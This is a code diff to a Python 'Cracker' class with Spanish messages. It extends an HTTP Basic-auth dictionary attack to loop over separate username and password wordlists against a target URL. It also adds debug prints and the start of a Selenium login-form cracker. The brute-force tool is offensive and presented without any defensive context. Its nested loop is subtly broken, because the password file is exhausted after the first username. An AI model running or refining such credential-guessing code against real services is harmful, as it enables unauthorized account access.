@@ -14,21 +14,26 @@ class Cracker:
         self.password=""
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-    def basicauthcrack(self, dictionary):
-        dict=open(dictionary)
+    def basicauthcrack(self, dictionary_user, dictionary_pass):
+        dictus=open(dictionary_user)
+        dictpass=open(dictionary_pass)
         result=False
-        for linea in dict:
+        for lineaus in dictus:
             if result:
                 break
-            username=linea
-            for linea in dict:
-                password=linea
+            username=lineaus
+            for lineapass in dictpass:
+                password=lineapass
                 response = requests.get(self.urlattack, auth=HTTPBasicAuth(username, password))
+                print(response)
                 if response.status_code == 200:
                     result=True
                     print('Usuario '+username+' y contraseña '+password+' válidos')
                     break
-        dict.close()
+        if not result:
+            print('Ningún usuario y contraseña válidos')
+        dictus.close()
+        dictpass.close()
 
     def digestauthcrack(self, username, password):
         response = requests.get(self.urlattack, auth=HTTPDigestAuth(username, password))
@@ -51,6 +56,7 @@ class Cracker:
             print('Bad Status code')
 
         htmlcode = HTML(response.text, "html.parser")
+        print(htmlcode)
         login_form = htmlcode.get_login_forms()[0]
         datasend = {'data': {}}
 
@@ -70,3 +76,8 @@ class Cracker:
         else:
             print('Usuario y contraseña incorrectos')
 
+    def seleniumformcrack(self):
+        driver=webdriver.Safari()
+        driver.get(self.urlattack)
+
+        user_box = driver.find_element_by_id('username')
